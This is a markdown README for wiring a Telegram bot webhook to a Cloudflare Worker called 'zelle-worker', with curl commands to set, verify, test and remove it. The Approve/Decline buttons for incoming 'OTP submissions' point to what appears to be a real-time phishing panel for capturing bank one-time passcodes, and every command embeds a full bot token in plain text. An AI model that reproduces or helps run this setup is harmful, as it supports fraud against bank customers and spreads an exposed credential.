# 🔔 TELEGRAM WEBHOOK SETUP

## ⚠️ CRITICAL: This must be done for Approve/Decline buttons to work!

The Telegram buttons (Approve ✅ / Decline ❌) send callbacks to your Cloudflare Worker.
You **MUST** register the webhook URL with Telegram.

---

## 📡 Set Up Webhook (One-Time Setup)

Run this command **once** (use PowerShell, CMD, or Git Bash):

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook" -d "url=https://zelle-worker.thebighandle.workers.dev/telegram-webhook"
```

**Expected Response:**
```json
{
  "ok": true,
  "result": true,
  "description": "Webhook was set"
}
```

---

## ✅ Verify Webhook is Active

Check the current webhook status:

```bash
curl -X GET "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/getWebhookInfo"
```

**Expected Response:**
```json
{
  "ok": true,
  "result": {
    "url": "https://zelle-worker.thebighandle.workers.dev/telegram-webhook",
    "has_custom_certificate": false,
    "pending_update_count": 0
  }
}
```

---

## 🧪 Test Webhook (Optional)

Send a test callback to your Worker:

```bash
curl -X POST "https://zelle-worker.thebighandle.workers.dev/telegram-webhook" \
  -H "Content-Type: application/json" \
  -d '{"callback_query":{"id":"test123","data":"approve_999"}}'
```

**Expected Response:**
```json
{"ok":true}
```

---

## 🔄 Update Webhook (If Worker URL Changes)

If you change your Worker domain or subdomain, re-run:

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook" -d "url=YOUR_NEW_WORKER_URL/telegram-webhook"
```

---

## ❌ Remove Webhook (To Disable Callbacks)

To stop receiving callbacks:

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/deleteWebhook"
```

---

## 🛠️ Troubleshooting

### **Issue: Buttons don't respond when clicked**

**Possible Causes:**
1. Webhook not set (run `setWebhook` command)
2. Worker not deployed
3. Worker URL changed (update webhook)
4. Worker error (check Cloudflare logs)

**Fix:**
- Verify webhook with `getWebhookInfo`
- Check Worker logs in Cloudflare dashboard
- Test webhook manually with curl

---

### **Issue: "Webhook was set" but still not working**

**Fix:**
- Wait 30 seconds for Telegram to propagate
- Test with a fresh OTP submission
- Check Cloudflare Worker logs for incoming requests

---

### **Issue: Getting old webhook URL error**

**Fix:**
Delete old webhook and set new one:

```bash
curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/deleteWebhook"

# Wait 5 seconds

curl -X POST "https://api.telegram.org/bot5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00/setWebhook" -d "url=https://zelle-worker.thebighandle.workers.dev/telegram-webhook"
```

---

## 📝 Notes

- Webhook URL must be **HTTPS** (Telegram requirement)
- Webhook is **account-wide** (applies to entire bot)
- Only **one webhook** can be active at a time
- Cloudflare Workers have **no extra setup** required for HTTPS
- Callbacks are sent instantly when buttons are clicked

---

**You're all set! 🎉**
